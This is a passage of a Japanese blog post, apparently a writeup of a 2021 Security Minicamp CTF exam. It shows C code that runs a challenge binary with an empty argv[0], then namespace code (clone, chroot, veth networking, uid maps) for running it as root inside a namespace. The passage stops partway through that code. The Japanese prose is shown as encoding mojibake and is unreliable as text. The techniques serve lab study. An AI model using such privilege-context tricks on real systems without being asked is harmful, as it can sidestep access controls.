<!doctype html><html lang=ja><head>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1">
<title>ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ»ãƒŸãƒ‹ã‚­ãƒ£ãƒ³ãƒ— ã‚ªãƒ³ãƒ©ã‚¤ãƒ³ 2021 ä¿®äº†è©¦é¨“ writeup</title>
<link rel=stylesheet href=/sass/main.min.8ec18d2efeaa7d2deb1054087c7d904060dfd4014322bd5debece96935389302.css>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css integrity=sha384-KiWOvVjnN8qwAZbuQyWDIbfCLFhLXNETzBQjA/92pIowpC0d2O3nppDGQVgwd2nB crossorigin=anonymous>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.js integrity=sha384-0fdwu/T/EQMsQlrHCCHoH10pkPLlKA1jL5dFyUOvB3lfeT2540/2g6YgSi2BL14p crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous onload=renderMathInElement(document.body)></script>
<script defer>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script>
<script defer src=/js/prism.min.js></script>
<link rel=stylesheet href=/css/prism.min.css>
</head>
<body>
<main id=content>
<p class=category>
ã‚«ãƒ†ã‚´ãƒªãƒ¼: <a href=/post>post</a>
</p>
<article class=suuri><p>::: messages notice<br>
ã“ã‚Œã¯ 2021/10/30(åœŸ) ã‹ã‚‰ 2021/11/20(åœŸ) ã‹ã‘ã¦è¡Œã‚ã‚ŒãŸã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ»ãƒŸãƒ‹ã‚­ãƒ£ãƒ³ãƒ— ã‚ªãƒ³ãƒ©ã‚¤ãƒ³ 2021 ã®ä¿®äº†è©¦é¨“ã® writeup ã§ã™ã€‚<br>
:::</p>
<p>CTF å½¢å¼ã§ã€å…¨ 5 å›ã®è¬›ç¾©ã«ã¾ã¤ã‚ã‚‹è¬›ç¾©ãŒãã‚Œãã‚Œ 1 å•ãšã¤ã€è¨ˆ 5 å•(+ãƒ•ãƒ©ã‚°æå‡ºç¢ºèªç”¨ã®ä¸€å•)ãŒå‡ºé¡Œã•ã‚Œã€ã“ã‚Œã‚’ 9 æ™‚ãã‚‰ã„ã‹ã‚‰ 11:30 ã¾ã§ã® 2 æ™‚é–“ 30 åˆ†ã®é–“ã§è§£ãã¾ã—ãŸã€‚</p>
<p>ç§ã¯ä»¥ä¸‹ã‚’è§£ãã¾ã—ãŸã€‚</p>
<ul>
<li>newbie 1 ç‚¹</li>
<li>DAY3 Linux ã‚·ã‚¹ãƒ†ãƒ ãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚° 20 ç‚¹</li>
<li>DAY1 ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ  20 ç‚¹</li>
<li>DAY2 ã‚µã‚¤ãƒãƒ¼æ”»æ’ƒå¯¾å¿œå…¥é–€ 20 ç‚¹</li>
</ul>
<p>ã“ã®ã†ã¡ newbie ã¯ãƒ•ãƒ©ã‚°æå‡ºç¢ºèªç”¨ã§ã™ã€‚</p>
<p>ã¾ãŸã€ä»¥ä¸‹ã®å•é¡ŒãŒè§£ã‘ã¾ã›ã‚“ã§ã—ãŸã€‚</p>
<ul>
<li>DAY3 ã‚³ãƒ³ãƒ†ãƒŠã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£</li>
<li>DAY2 ãƒãƒ«ã‚¦ã‚§ã‚¢ã®ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’åˆ†æãƒ»æ¤œçŸ¥ã—ã¦ã¿ã‚ˆã†</li>
</ul>
<p>è¨ˆ 3 å•+1 å•ã‚’è§£ã„ã¦ã€è¡¨å½°ä¸Šï¼Ÿ1 ä½ã¨ 1.5 ä½ã«ã¤ã¥ãåŒç‡ 2 ä½ã§ã—ãŸã€‚(scoreboard ä¸Šã§ã¯ 3 ä½)</p>
<p>ãã‚Œã§ã¯ writeup ã®å†…å®¹ã«ç§»ã‚Šã¾ã™ã€‚</p>
<h1 id=newbie>newbie</h1>
<p>ãƒ•ãƒ©ã‚°ãŒå•é¡Œæ–‡ã«æ›¸ã„ã¦ã„ã¦ã€æå‡ºã—ã¦ãã ã•ã„ã¨ã„ã†å•é¡Œã€‚æå‡ºç¢ºèªç”¨ã§ã—ãŸã€‚</p>
<h1 id=day3-linux-ã‚·ã‚¹ãƒ†ãƒ ãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°>DAY3 Linux ã‚·ã‚¹ãƒ†ãƒ ãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°</h1>
<p>ssh ã—ãŸå…ˆã®ç’°å¢ƒã§ã‚ã‚‹å®Ÿè¡Œãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚ã‚‹ç’°å¢ƒã®ã‚‚ã¨å®Ÿè¡Œã›ã‚ˆã¨ã„ã†å•é¡Œã§ã—ãŸã€‚<br>
å…·ä½“çš„ã«ã¯</p>
<ul>
<li><code>/try_running_me</code> ã¨ã„ã†å®Ÿè¡Œãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã€ç¬¬ 0 å¼•æ•°ã‚’ <code>"" (empty string)</code> ã¨ã—ã¦ã€root ã§å®Ÿè¡Œã™ã‚‹</li>
</ul>
<p>ã¨ã„ã†ã‚‚ã®ã§ã—ãŸã€‚</p>
<h2 id=æ™‚é–“ä¸­ã«ã‚„ã£ãŸã“ã¨>æ™‚é–“ä¸­ã«ã‚„ã£ãŸã“ã¨</h2>
<p>ã¾ãš <code>ls</code> ã—ã¦å‡ºã¦ããŸ <code>README</code> ã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã«å¾“ã£ã¦ <code>/try_running_me</code> ã‚’å®Ÿè¡Œã—ã¦ã¿ã¾ã™ã€‚</p>
<pre tabindex=0><code>$ /try_running_me
oops!
run this binary with setting 0-th argument to &quot;&quot; (empty string)
</code></pre><p>ãˆã£ <code>argv[0]</code> ã£ã¦ç©ºæ–‡å­—åˆ—ã«å¤‰æ›´ã§ãã‚‹ã‚“ã§ã™ã‹&mldr;ï¼Ÿ<code>/proc</code>ç³»ã‚’ã¯ã˜ã‚ç–‘ã£ã¦ã„ãŸã®ã§ã™ãŒã€è½ã¡ç€ã„ã¦è¬›ç¾©ã‚’æ€ã„å‡ºã™ã¨ãŠã¼ã‚ã’ãªãŒã‚‰ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å®Ÿè¡Œã™ã‚‹ã¨ãã«å®Ÿè¡Œãƒ‘ã‚¹ã‚’<code>argv</code>ã«å…¥ã‚ŒãŸæ°—ãŒã—ã¦ãã¾ã—ãŸï½ï½ï½ï¼<br>
ã“ã“ã§è¬›ç¾©ã®äº‹å‰èª²é¡Œ 2 ã§æ›¸ã„ãŸ C ã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’è¦‹è¿”ã™ã¨ã€ã“ã‚“ãªæ„Ÿã˜ã«ãªã£ã¦ã„ã¾ã™ã€‚</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>int</span> <span class=nf>child</span><span class=p>(</span><span class=k>struct</span> <span class=n>child_process</span><span class=o>*</span> <span class=n>p</span><span class=p>){</span>
        <span class=kt>char</span><span class=o>*</span> <span class=n>path</span> <span class=o>=</span> <span class=n>p</span><span class=o>-&gt;</span><span class=n>binary</span><span class=p>;</span>
        <span class=kt>char</span><span class=o>*</span> <span class=n>arg</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=n>path</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
        <span class=kt>char</span><span class=o>*</span> <span class=n>env</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=nb>NULL</span><span class=p>};</span>
        <span class=n>dup2</span><span class=p>(</span><span class=n>p</span><span class=o>-&gt;</span><span class=n>fd</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>STDOUT_FILENO</span><span class=p>);</span>
        <span class=n>execve</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>arg</span><span class=p>,</span> <span class=n>env</span><span class=p>);</span>
        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></div><p>ã“ã‚Œã‚‚ã—ã‹ã—ã¦</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>char</span><span class=o>*</span> <span class=n>arg</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=s>&#34;&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
</code></pre></div><p>ã«å¤‰æ›´ã™ã‚Œã°å‹ã¦ã‚‹ã®ã§ã¯ï¼ŸSSH ç’°å¢ƒä¸‹ãªã®ã§ C ã‚’æ›¸ã„ã¦ gcc ã‚‚å…¥ã£ã¦ã„ãŸã®ã§ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã—ã¾ã™ã€‚</p>
<p>ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã£ã¦ã„ã¾ã™ã€‚</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#define _GNU_SOURCE
</span><span class=cp>#include</span> <span class=cpf>&lt;sched.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;signal.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;sys/wait.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span><span class=cp></span>
<span class=cp>#define OUTPUT_BUFFER_SIZE 1024
</span><span class=cp></span>
<span class=k>struct</span> <span class=n>child_process</span><span class=p>{</span>
        <span class=kt>void</span><span class=o>*</span> <span class=n>binary</span><span class=p>;</span>
        <span class=kt>int</span><span class=o>*</span> <span class=n>fd</span><span class=p>;</span>
<span class=p>};</span>

<span class=kt>int</span> <span class=nf>child</span><span class=p>(</span><span class=k>struct</span> <span class=n>child_process</span><span class=o>*</span> <span class=n>p</span><span class=p>){</span>
        <span class=kt>char</span><span class=o>*</span> <span class=n>path</span> <span class=o>=</span> <span class=n>p</span><span class=o>-&gt;</span><span class=n>binary</span><span class=p>;</span>
        <span class=kt>char</span><span class=o>*</span> <span class=n>arg</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=s>&#34;&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
        <span class=kt>char</span><span class=o>*</span> <span class=n>env</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=nb>NULL</span><span class=p>};</span>
        <span class=n>dup2</span><span class=p>(</span><span class=n>p</span><span class=o>-&gt;</span><span class=n>fd</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>STDOUT_FILENO</span><span class=p>);</span>
        <span class=n>execve</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>arg</span><span class=p>,</span> <span class=n>env</span><span class=p>);</span>
        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
<span class=p>}</span>

<span class=kt>int</span> <span class=nf>execute_binary</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=k>const</span> <span class=n>binary</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=k>const</span> <span class=n>buffer</span><span class=p>,</span> <span class=k>const</span> <span class=n>size_t</span> <span class=n>bufsize</span><span class=p>)</span> <span class=p>{</span>
        <span class=kt>int</span> <span class=n>p</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>pipe</span><span class=p>(</span><span class=n>p</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
                <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;pipe failed</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
                <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=p>}</span>
        <span class=k>struct</span> <span class=n>child_process</span> <span class=n>process</span><span class=p>;</span>
        <span class=n>process</span><span class=p>.</span><span class=n>binary</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>binary</span><span class=p>;</span>
        <span class=n>process</span><span class=p>.</span><span class=n>fd</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>p</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
        <span class=c1>//puts(&#34;child_process done&#34;);
</span><span class=c1></span>
        <span class=kt>void</span><span class=o>*</span> <span class=n>stack</span> <span class=o>=</span> <span class=n>mmap</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span> <span class=mi>1024</span><span class=o>*</span><span class=mi>1024</span><span class=p>,</span><span class=n>PROT_READ</span><span class=o>|</span><span class=n>PROT_WRITE</span><span class=p>,</span><span class=n>MAP_PRIVATE</span><span class=o>|</span><span class=n>MAP_ANONYMOUS</span><span class=o>|</span><span class=n>MAP_GROWSDOWN</span><span class=o>|</span><span class=n>MAP_STACK</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
        <span class=n>pid_t</span> <span class=n>c</span> <span class=o>=</span> <span class=n>clone</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>child</span><span class=p>,</span> <span class=n>stack</span> <span class=o>+</span> <span class=mi>1024</span><span class=o>*</span><span class=mi>1024</span><span class=p>,</span> <span class=n>SIGCHLD</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>process</span><span class=p>);</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>c</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
                <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;clone failed</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
                <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=p>}</span>
        <span class=n>waitpid</span><span class=p>(</span><span class=n>c</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
        <span class=c1>//puts(&#34;wait done&#34;);
</span><span class=c1></span>        <span class=n>ssize_t</span> <span class=n>sz</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=n>process</span><span class=p>.</span><span class=n>fd</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>buffer</span><span class=p>,</span> <span class=n>bufsize</span><span class=p>);</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>sz</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
                <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;read failed</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
                <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=p>}</span>
        <span class=c1>//puts(&#34;sz ok&#34;);
</span><span class=c1></span>        <span class=k>return</span> <span class=n>sz</span><span class=p>;</span>
<span class=p>}</span>

<span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
        <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=n>OUTPUT_BUFFER_SIZE</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
        <span class=kt>int</span> <span class=n>r</span> <span class=o>=</span> <span class=n>execute_binary</span><span class=p>(</span><span class=s>&#34;/try_running_me&#34;</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>OUTPUT_BUFFER_SIZE</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>

        <span class=k>if</span> <span class=p>(</span><span class=n>r</span> <span class=o>&gt;=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
                <span class=n>buf</span><span class=p>[</span><span class=n>r</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
                <span class=n>printf</span><span class=p>(</span><span class=s>&#34;read %d bytes</span><span class=se>\n</span><span class=s>%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>r</span><span class=p>,</span> <span class=n>buf</span><span class=p>);</span>
        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
                <span class=n>printf</span><span class=p>(</span><span class=s>&#34;error %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>r</span><span class=p>);</span>
        <span class=p>}</span>
<span class=p>}</span>
</code></pre></div><p>ã™ã‚‹ã¨ã€ãªã«ã‚„ã‚‰é•ã†ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒå‡ºã¦ãã¾ã—ãŸã€‚</p>
<pre tabindex=0><code>you're half way there!
run this binary as root. note that you should keep 0-th argument &quot;&quot;
</code></pre><p>ã©ã†ã‚„ã‚‰ã“ã®ã¾ã¾ root ã§å®Ÿè¡Œã›ã‚ˆã¨ã®ã“ã¨ã§ã™ã€‚ <code>sudo</code> ã¯å…¥ã£ã¦ã„ãªã„ç’°å¢ƒã§ã—ãŸã€‚</p>
<p>ã“ã‚Œã‚‚è¬›ç¾©ã§ã‚„ã£ãŸãªï¼ã¨æ€ã„ã€è¬›ç¾©ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰å¿…è¦ã®ãªã„ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯éƒ¨åˆ†ã ã‘å‰Šé™¤ã‚„ã‚³ãƒ¡ãƒ³ãƒˆã‚¢ã‚¦ãƒˆã—ã¦ã¿ã¾ã™ã€‚</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#define _GNU_SOURCE
</span><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;errno.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;sched.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;signal.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;sys/wait.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span><span class=cp></span>
<span class=cp>#define STR_BUF_SIZE 1024
</span><span class=cp>#define SHELL_PATH &#34;/bin/bash&#34;
</span><span class=cp></span>
<span class=kt>int</span> <span class=nf>chroot_dir</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span><span class=o>*</span><span class=k>const</span> <span class=n>path</span><span class=p>)</span> <span class=p>{</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>chroot</span><span class=p>(</span><span class=n>path</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>chdir</span><span class=p>(</span><span class=s>&#34;/&#34;</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
<span class=p>}</span>



<span class=kt>int</span> <span class=nf>exec_command_child</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>cmd</span><span class=p>)</span> <span class=p>{</span>
        <span class=kt>char</span><span class=o>*</span> <span class=k>const</span> <span class=n>argv</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=n>SHELL_PATH</span><span class=p>,</span> <span class=s>&#34;-c&#34;</span><span class=p>,</span> <span class=n>cmd</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
        <span class=kt>char</span><span class=o>*</span> <span class=k>const</span> <span class=n>envp</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=nb>NULL</span><span class=p>};</span>
        <span class=n>execve</span><span class=p>(</span><span class=n>SHELL_PATH</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=n>envp</span><span class=p>);</span>
        <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>

<span class=p>}</span>

<span class=kt>int</span> <span class=nf>exec_command</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=k>const</span> <span class=n>cmd</span><span class=p>)</span> <span class=p>{</span>
        <span class=kt>char</span><span class=o>*</span> <span class=n>stack</span> <span class=o>=</span> <span class=n>mmap</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span><span class=mi>1024</span><span class=o>*</span><span class=mi>1024</span><span class=p>,</span><span class=n>PROT_READ</span><span class=o>|</span><span class=n>PROT_WRITE</span><span class=p>,</span>
                                        <span class=n>MAP_PRIVATE</span><span class=o>|</span><span class=n>MAP_ANONYMOUS</span><span class=o>|</span><span class=n>MAP_GROWSDOWN</span><span class=o>|</span><span class=n>MAP_STACK</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>stack</span> <span class=o>==</span> <span class=n>MAP_FAILED</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=n>pid_t</span> <span class=n>child</span> <span class=o>=</span> <span class=n>clone</span><span class=p>((</span><span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=p>)(</span><span class=kt>void</span> <span class=o>*</span><span class=p>))</span><span class=n>exec_command_child</span><span class=p>,</span> <span class=n>stack</span><span class=o>+</span><span class=mi>1024</span><span class=o>*</span><span class=mi>1024</span><span class=p>,</span> <span class=n>SIGCHLD</span><span class=p>,</span> <span class=n>cmd</span><span class=p>);</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>child</span> <span class=o>==-</span><span class=mi>1</span><span class=p>)</span><span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>waitpid</span><span class=p>(</span><span class=n>child</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span><span class=mi>0</span><span class=p>)</span><span class=o>==-</span><span class=mi>1</span><span class=p>)</span><span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
<span class=p>}</span>

<span class=kt>int</span> <span class=nf>parent_install_network</span><span class=p>(</span><span class=n>pid_t</span> <span class=n>child</span><span class=p>)</span> <span class=p>{</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>exec_command</span><span class=p>(</span><span class=s>&#34;ip link add vethA type veth peer vethB&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>exec_command</span><span class=p>(</span><span class=s>&#34;ip link set dev vethA up&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>exec_command</span><span class=p>(</span><span class=s>&#34;ip address add 10.0.0.1/24 dev vethA&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=kt>char</span> <span class=n>cmd</span><span class=p>[</span><span class=n>STR_BUF_SIZE</span><span class=p>];</span>
        <span class=n>snprintf</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span> <span class=n>STR_BUF_SIZE</span><span class=p>,</span> <span class=s>&#34;ip link set dev vethB netns %d&#34;</span><span class=p>,</span> <span class=n>child</span><span class=p>);</span>
        <span class=n>exec_command</span><span class=p>(</span><span class=n>cmd</span><span class=p>);</span>
<span class=p>}</span>

<span class=kt>int</span> <span class=nf>child_install_network</span><span class=p>()</span> <span class=p>{</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>exec_command</span><span class=p>(</span><span class=s>&#34;ip link set dev vethB up&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>exec_command</span><span class=p>(</span><span class=s>&#34;ip address add 10.0.0.2/24 dev vethB&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>exec_command</span><span class=p>(</span><span class=s>&#34;ip route add default via 10.0.0.1&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
<span class=p>}</span>

<span class=kt>int</span> <span class=nf>parent_uninstall_network</span><span class=p>(){</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>exec_command</span><span class=p>(</span><span class=s>&#34;ip link delete vethA&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>

<span class=p>}</span>

<span class=k>typedef</span> <span class=k>struct</span> <span class=p>{</span>
        <span class=kt>int</span> <span class=n>fd</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
<span class=p>}</span> <span class=n>isolated_child_args_t</span><span class=p>;</span>

<span class=kt>int</span> <span class=nf>write_file</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span><span class=o>*</span><span class=k>const</span> <span class=n>path</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=k>const</span> <span class=n>str</span><span class=p>)</span> <span class=p>{</span>
        <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>O_WRONLY</span><span class=p>);</span>
        <span class=kt>int</span> <span class=n>len</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
        <span class=k>for</span><span class=p>(</span><span class=n>len</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=n>str</span><span class=p>[</span><span class=n>len</span><span class=p>]</span> <span class=o>!=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span><span class=n>len</span><span class=o>++</span><span class=p>);</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>str</span><span class=p>,</span> <span class=n>len</span><span class=p>)</span> <span class=o>!=</span> <span class=n>len</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>close</span><span class=p>(</span><span class=n>fd</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
<span class=p>}</span>

<span class=kt>int</span> <span class=nf>write_ug_map</span><span class=p>(</span><span class=n>pid_t</span> <span class=n>child</span><span class=p>)</span> <span class=p>{</span>
        <span class=kt>char</span> <span class=n>path</span><span class=p>[</span><span class=n>STR_BUF_SIZE</span><span class=p>],</span> <span class=n>data</span><span class=p>[</span><span class=n>STR_BUF_SIZE</span><span class=p>];</span>
        <span class=n>snprintf</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>STR_BUF_SIZE</span><span class=p>,</span> <span class=s>&#34;/proc/%d/setgroups&#34;</span><span class=p>,</span> <span class=n>child</span><span class=p>);</span>
